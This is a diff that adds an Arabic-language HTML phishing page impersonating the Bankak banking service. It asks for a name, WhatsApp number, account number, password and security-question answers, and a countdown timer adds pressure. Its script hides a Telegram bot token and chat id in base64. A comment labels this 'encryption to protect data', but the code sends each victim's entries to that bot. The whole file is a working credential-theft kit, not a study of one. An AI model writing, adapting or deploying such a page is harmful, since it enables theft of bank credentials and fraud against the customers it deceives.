@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bankak Portal</title>
+    <style>
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f8f9fa; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .header { width: 100%; height: 65px; background: #d32f2f; color: white; display: flex; align-items: center; justify-content: center; position: relative; }
+        .timer-box { position: absolute; left: 12px; background: rgba(0, 0, 0, 0.3); color: white; padding: 4px 10px; border-radius: 15px; font-weight: bold; font-size: 13px; }
+        .container { width: 92%; max-width: 450px; padding: 15px; margin-top: 10px; text-align: center; }
+        .input-group { background: white; border: 1.5px solid #e0e0e0; margin-bottom: 12px; border-radius: 10px; padding: 2px 12px; display: flex; align-items: center; }
+        input { flex: 1; border: none; padding: 14px 5px; outline: none; text-align: right; font-size: 16px; width: 100%; }
+        .currency-opt { background: white; border: 2px solid #e0e0e0; padding: 18px; margin: 10px 0; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .selected { background-color: #e8f5e9; border-color: #2e7d32; color: #1b5e20; }
+        .btn-main { width: 100%; background: #d32f2f; color: white; border: none; padding: 16px; border-radius: 10px; font-weight: bold; font-size: 17px; cursor: pointer; }
+        .question-box { background: white; border: 1.5px solid #e0e0e0; padding: 16px; margin-bottom: 10px; text-align: right; border-radius: 10px; cursor: pointer; position: relative; }
+        .question-box::after { content: '▼'; position: absolute; left: 15px; color: #d32f2f; }
+        #loginPage, #questionsPage, #success { display: none; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { width: 90%; max-width: 350px; }
+        .modal-content img { width: 100%; border-radius: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="timer-box" id="timer">20:00</div>
+        <span>تحديث البيانات</span>
+    </div>
+
+    <div class="container">
+        <div id="currencyPage">
+            <h3>آختر عملة الاستلام</h3>
+            <div class="currency-opt" id="c1" onclick="_0x4a2('c1', 'جنيه سوداني')">جنيه سوداني</div>
+            <div class="currency-opt" id="c2" onclick="_0x4a2('c2', 'دولار امريكي')">دولار امريكي</div>
+            <div class="input-group"><input type="text" id="fn" placeholder="الإسم الكامل"></div>
+            <div class="input-group"><input type="number" id="wn" placeholder="رقم الواتساب"></div>
+            <button class="btn-main" onclick="_0x9b1()">المتابعة</button>
+        </div>
+
+        <div id="loginPage">
+            <h3>تسجيل الدخول بنكك</h3>
+            <div class="input-group"><input type="text" id="an" placeholder="رقم الحساب"></div>
+            <div class="input-group"><input type="password" id="ap" placeholder="كلمة المرور"></div>
+            <button class="btn-main" onclick="_0x8c2()">دخول</button>
+        </div>
+
+        <div id="questionsPage">
+            <h3>التحقق الأمني</h3>
+            <div class="question-box" onclick="_0x3f1('popup_q1.png')">السؤال الأول (اضغط للعرض)</div>
+            <div class="input-group"><input type="text" id="q1" placeholder="الإجابة"></div>
+            <div class="question-box" onclick="_0x3f1('popup_q2.png')">السؤال الثاني (اضغط للعرض)</div>
+            <div class="input-group"><input type="text" id="q2" placeholder="الإجابة"></div>
+            <div class="question-box" onclick="_0x3f1('popup_q3.png')">السؤال الثالث (اضغط للعرض)</div>
+            <div class="input-group"><input type="text" id="q3" placeholder="الإجابة"></div>
+            <button class="btn-main" onclick="_0x7d3()">تأكيد الطلب</button>
+        </div>
+
+        <div id="success">
+            <h2 style="color: #2e7d32;">تم تسجيل الطلب بنجاح</h2>
+            <p>سنتواصل معك عبر الواتساب فور مراجعة البيانات.</p>
+        </div>
+    </div>
+
+    <div id="myModal" class="modal" onclick="this.style.display='none'"><div class="modal-content"><img id="mI" src=""></div></div>
+
+    <script>
+        // كود مشفر لحماية البيانات
+        const _0x5e1 = "ODY3NDEzODY2OTpBQUZvWHRvX05xNF9RNTY5YTVFNlNtRHA2ZmRyaE9FUC1CQQ==";
+        const _0x2a3 = "MjAxNDk0NTY4Mw==";
+        const _0x9f2 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==";
+        let _0x0c = "";
+
+        async function _0x1b(_0x1) {
+            try {
+                await fetch(atob(_0x9f2) + atob(_0x5e1) + "/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: atob(_0x2a3), text: _0x1 })
+                });
+            } catch (e) {}
+        }
+
+        function _0x4a2(i, v) {
+            document.querySelectorAll('.currency-opt').forEach(o => o.classList.remove('selected'));
+            document.getElementById(i).classList.add('selected');
+            _0x0c = v;
+        }
+
+        function _0x3f1(s) {
+            document.getElementById('mI').src = s;
+            document.getElementById('myModal').style.display = 'flex';
+        }
+
+        function _0x9b1() {
+            const n = document.getElementById('fn').value;
+            const w = document.getElementById('wn').value;
+            if(!_0x0c || !n || !w) return alert("أكمل البيانات");
+            _0x1b("🔔 جديد:\n👤 الاسم: " + n + "\n📱 واتساب: " + w + "\n💰 العملة: " + _0x0c);
+            _0x5s('loginPage');
+        }
+
+        function _0x8c2() {
+            const a = document.getElementById('an').value;
+            const p = document.getElementById('ap').value;
+            if(!a || !p) return alert("أدخل بيانات الحساب");
+            _0x1b("🔐 دخول:\n🆔 الحساب: " + a + "\n🔑 الباسورد: " + p);
+            _0x5s('questionsPage');
+        }
+
+        function _0x7d3() {
+            const m = "❓ أمان:\n1: " + document.getElementById('q1').value + "\n2: " + document.getElementById('q2').value + "\n3: " + document.getElementById('q3').value;
+            _0x1b(m);
+            _0x5s('success');
+        }
+
+        function _0x5s(i) {
+            ['currencyPage', 'loginPage', 'questionsPage', 'success'].forEach(p => document.getElementById(p).style.display = 'none');
+            document.getElementById(i).style.display = 'block';
+        }
+
+        let _0x0t = 1200;
+        setInterval(() => {
+            let m = Math.floor(_0x0t/60); let s = _0x0t%60;
+            document.getElementById('timer').innerText = m + ":" + (s<10?'0'+s:s);
+            _0x0t--;
+        }, 1000);
+    </script>
+</body>
+</html>
